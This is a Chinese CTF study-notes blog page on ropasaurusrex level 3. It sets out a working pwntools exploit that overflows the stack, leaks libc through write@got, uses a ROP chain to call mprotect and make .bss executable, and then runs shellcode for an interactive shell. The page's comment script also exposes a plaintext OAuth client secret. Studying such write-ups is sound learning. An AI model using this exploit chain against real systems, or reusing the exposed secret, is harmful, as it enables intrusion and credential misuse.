@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>ropasaurusrex level3 | 喵喵喵喵 | 某鱼唇的人类</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#66CCFF">
+    
+    
+    <meta name="keywords" content="CTF,Pwn">
+    <meta name="description" content="至今为止都是调用system(“&#x2F;bin&#x2F;sh”)的攻略方式  system()超甜 接下来在chroot环境下运行level2 system()隐式调用”&#x2F;bin&#x2F;sh” 调用system(command)时，内部是这样 execve(“&#x2F;bin&#x2F;sh”, &amp;[“-c”, command, NULL], envp)   这意味着，chroot环境下，调用system会失败   需要一种没">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ropasaurusrex level3">
+<meta property="og:url" content="https://darkwing.moe/2019/04/23/ropasaurusrex-level3/index.html">
+<meta property="og:site_name" content="喵喵喵喵">
+<meta property="og:description" content="至今为止都是调用system(“&#x2F;bin&#x2F;sh”)的攻略方式  system()超甜 接下来在chroot环境下运行level2 system()隐式调用”&#x2F;bin&#x2F;sh” 调用system(command)时，内部是这样 execve(“&#x2F;bin&#x2F;sh”, &amp;[“-c”, command, NULL], envp)   这意味着，chroot环境下，调用system会失败   需要一种没">
+<meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019042302.jpg">
+<meta property="article:published_time" content="2019-04-23T07:07:23.000Z">
+<meta property="article:modified_time" content="2019-04-23T07:08:20.974Z">
+<meta property="article:author" content="暗羽">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019042302.jpg">
+    
+        <link rel="alternate" type="application/atom+xml" title="喵喵喵喵" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">暗羽</h5>
+          <a href="mailto:1126955201@qq.com" title="1126955201@qq.com" class="mail">1126955201@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.weibo.com/zjicmDarkWing" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://twitter.com/darkwing_nya" target="_blank" >
+                <i class="icon icon-lg icon-gratipay"></i>
+                网恋选我我超甜
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/links"  >
+                <i class="icon icon-lg icon-link"></i>
+                一些链接
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">ropasaurusrex level3</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">ropasaurusrex level3</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-04-23T07:07:23.000Z" itemprop="datePublished" class="page-time">
+  2019-04-23
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#exploit"><span class="post-toc-number">1.</span> <span class="post-toc-text">exploit</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-ropasaurusrex-level3"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">ropasaurusrex level3</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-04-23 15:07:23" datetime="2019-04-23T07:07:23.000Z"  itemprop="datePublished">2019-04-23</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>至今为止都是调用system(“/bin/sh”)的攻略方式</p>
+<ul>
+<li>system()超甜</li>
+<li>接下来在chroot环境下运行level2</li>
+<li>system()隐式调用”/bin/sh”<ul>
+<li>调用system(command)时，内部是这样<ul>
+<li>execve(“/bin/sh”, &amp;[“-c”, command, NULL], envp)</li>
+</ul>
+</li>
+<li>这意味着，chroot环境下，调用system会失败</li>
+</ul>
+</li>
+<li>需要一种没有system()，不访问/bin的攻略方式</li>
+</ul>
+<p>两种可能方式：</p>
+<ol>
+<li>使用C语言中存在的函数opendir和readdir获取文件名，之后使用open, read, write 来读取Flag</li>
+<li>使用mprotect重写.bss的RWX权限，之后在该区域执行shellcode</li>
+</ol>
+<p><code>int mprotect(const void *addr, size_t len, int prot);</code></p>
+<p>mprotect的定义如上</p>
+<p>mprotect()能够更改[addr, addr+len-1]地址范围的访问保护。addr必须与页面边界一致。</p>
+<p>bss地址的开头是地址减去偏移量，即0x08049628-0x628</p>
+<p><code>[25] .bss              NOBITS          08049628 000628 000008 00  WA  0   0  4</code></p>
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"># preparing for exploitation</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; 0x0804830c</span><br><span class="line">read_plt &#x3D; 0x0804832c</span><br><span class="line">pop3ret &#x3D; 0x80484b6</span><br><span class="line">write_got &#x3D; 0x8049614</span><br><span class="line">read_got &#x3D; 0x804961c</span><br><span class="line">data &#x3D; 0x08049620</span><br><span class="line">system_offset &#x3D; 0x0003d200</span><br><span class="line">write_offset &#x3D; 0x000e6d80</span><br><span class="line">mprotect_offset &#x3D; 0x000f4660</span><br><span class="line">bss_addr &#x3D; 0x08049628 + 0x300</span><br><span class="line">bss_top_addr &#x3D; 0x08049000</span><br><span class="line">leave_ret &#x3D; 0x080482ea</span><br><span class="line"></span><br><span class="line">log.info(&#39;Pwning&#39;)</span><br><span class="line"></span><br><span class="line">buf &#x3D; &#39;A&#39; * 136</span><br><span class="line">buf +&#x3D; p32(bss_addr-4)</span><br><span class="line">buf +&#x3D; p32(read_plt)</span><br><span class="line">buf +&#x3D; p32(leave_ret)</span><br><span class="line">buf +&#x3D; p32(0)</span><br><span class="line">buf +&#x3D; p32(bss_addr)</span><br><span class="line">buf +&#x3D; p32(80)</span><br><span class="line"></span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line"># write(STDOUT, got_write, 4)</span><br><span class="line">buf2 &#x3D; p32(write_plt) + p32(pop3ret) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line"># read(STDIN, bss+80, len(shellcode))</span><br><span class="line">buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) +p32(bss_addr+80) + p32(len(shellcode))</span><br><span class="line"># read(STDIN, got_write, 4)</span><br><span class="line">buf2 +&#x3D; p32(read_plt) + p32(pop3ret) + p32(0) + p32(write_got) + p32(4)</span><br><span class="line"># write(bss+80)				# mprotect(.bss, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC)</span><br><span class="line">buf2 +&#x3D; p32(write_plt) + p32(bss_addr+80) + p32(bss_top_addr) + p32(0x1000) + p32(7)</span><br><span class="line"></span><br><span class="line">conn.send(buf)</span><br><span class="line">conn.send(buf2)</span><br><span class="line"></span><br><span class="line">ret &#x3D; u32(conn.recv())</span><br><span class="line">print(&#39;write@got: &#123;&#125;&#39;.format(hex(ret)))</span><br><span class="line">print(&#39;libc_start: &#123;&#125;&#39;.format(hex(ret - write_offset)))</span><br><span class="line">mprotect_addr &#x3D; ret - write_offset + mprotect_offset</span><br><span class="line">print(&#39;mprotect: &#123;&#125;&#39;.format(hex(mprotect_addr)))</span><br><span class="line"></span><br><span class="line">conn.send(shellcode)</span><br><span class="line">conn.send(p32(mprotect_addr))</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019042302.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2019-04-23T07:08:20.974Z" itemprop="dateUpdated">2019-04-23 15:08:20</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/&title=《ropasaurusrex level3》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/&title=《ropasaurusrex level3》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ropasaurusrex level3》 — 喵喵喵喵&url=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/05/09/%E8%BF%9B%E9%98%B6ROP%E5%8F%8Alibc/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">进阶ROP及libc</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/04/22/ropasaurusrex-level2/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">ropasaurusrex level2</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/&title=《ropasaurusrex level3》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/&title=《ropasaurusrex level3》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《ropasaurusrex level3》 — 喵喵喵喵&url=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2019/04/23/ropasaurusrex-level3/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACKElEQVR42u3aO27DMBAFwNz/0krrFJLfI6UAIoeVYcsQh8WC+/n5idfxsT6/uf41ef76XzcvDAyM1zKOy5W/4PqZs1/z9549g4GBsQ/j7MVjz+RHkIfpL3vGwMDACLaVB8cjWBgYGBj3Btw8pLZJLAYGBkabxM5sMX/+8VwcAwPjhYy86v7/nx/pb2BgYLyKcZQrT26vtzWW1p7uCgMDY2lGHuDyC19baMuT4S8NUQwMjKUZYxvKmwTzY2HJNxgYGKsy8iblWJLZjly0TYI/N1wMDIxtGFNNxADZHkH0FgwMjO0ZY63HPHFtGadVQwwMjKUZyfXriaS0ffspHgMDYwNGVGpvE8uyhNcmt1ESi4GBsRCjHa0YG78Y7FQkgRgDA2NpRj5O8UTDYIwXjVlgYGBswGhh1wW4diBjLChjYGCszZi58M0nvXnFLBoOw8DAWJQxf41ri2u3bS5fGBgYr2XMXPvawYj2UliMnWFgYCzNyNPXscGIscMaG8vAwMDYgTFTlM9LdW2zs2geYGBgbMAYK4TdW56buiZiYGBswBirbo0V15IGZ83DwMBYlHGU63orddo5kbh+6cFiYGAsxLgryOatzTywtkkvBgbG2oyZNsBYwW7syOqTxsDAWI7RNhfbQDk2WlEgMTAwMOK2ZR5e26vkFyoGBgZGnLgml8g2GY5GzTAwMDZg5OX+J5qabV0QAwNjN0Zby8pHJfL25F3hHgMDYznGL7qjS6ljAvRiAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
